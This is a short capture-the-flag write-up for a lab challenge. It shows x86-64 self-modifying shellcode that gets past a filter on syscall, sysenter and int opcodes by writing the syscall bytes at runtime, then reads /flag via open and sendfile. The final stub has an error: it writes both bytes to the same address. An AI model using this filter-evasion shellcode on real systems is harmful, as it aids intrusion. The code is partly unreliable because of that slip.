# Babyshell Level 5
Okay ! Now we are talking, this challenge was a little bit harder than the previous one, but was really fun to solve. Itried to solved it for like 3 hours before i quitted and the next day i was able to complete it on my own.

## Solving the Challenge
**What is the task :** We need to write a shellcode that does not contains any **syscall** (0x0f05), **sysenter** (0x0f34) or **int** (0x80cd) opcodes in our shellcode, this makes it a LOT harder for us to call into the kernel since we n eed to write **self-modifying code**, for this challenge we will heavily rely on labels, make sure you know what they  are before jumping into this !

So, after a bit of researching on how i could write this "self-modifying" shellcode, i found on discord that we could use a label for that, we are going to put **.word** values in our labels, with the value of 0x0000, however when the program will run, it will modify the value of our **.word** in the label for the syscall opcode, and we can just call the location of [rip+label] to execute the syscall instructions, let's start writing code :
```x86asm
.global _start
_start:
.intel_syntax noprefix
    # prepare syscall
    mov byte ptr[rip+syscall1], 0x0f
    mov byte ptr[rip+syscall1+1], 0x05
    lea r9, [rip+syscall1]

    # clear registers
    xor rbx, rbx
    xor rdx, rdx
    xor rdi, rdi
    xor rsi, rsi
    xor r10, r10

    # open file
    mov ebx, 0x67616c66
    shl rbx, 8
    mov bl, 0x2f
    push rbx
    mov rdi, rsp
    mov rax, 2
    call r9                 # syscall we jump inside our label

# sys_sendfile
syscall1:
    .word 0x0000
    
    xor r9, r9
    # prepare next syscall
    mov byte ptr[rip+syscall2], 0x0f
    mov byte ptr[rip+syscall2+1], 0x05
    lea r9, [rip+syscall2]

    xor rsi, rsi
    xor r10,r10
    xor rdi, rdi
    xor rdx, rdx
    xor rbx, rbx
    # sendfile
    mov rdi, 1
    mov rsi, rax
    mov r10, 100
    mov rax, 40
    call r9

# sys_exit
syscall2:
    .word 0x0000

    xor r9, r9
    # prepare syscall
    mov byte ptr[rip+syscall3], 0x0f
    mov byte ptr[rip+syscall3], 0x05
    lea r9, [rip+syscall3]
    xor rsi, rsi
    xor r10, r10
    xor rax, rax
    xor rdi, rdi
    mov rax, 60
    mov rdi, 5
    call r9

syscall3:
    .word 0x0000
```

I am not sure it's the best optimized way to do this challenge, but i decided to do it this way and it works pretty well, i do a lot of registers clearing because i had an issue with the program where registers would change before executing syscall, by clearing register i was able to execute each syscalls and write the flag properly :)
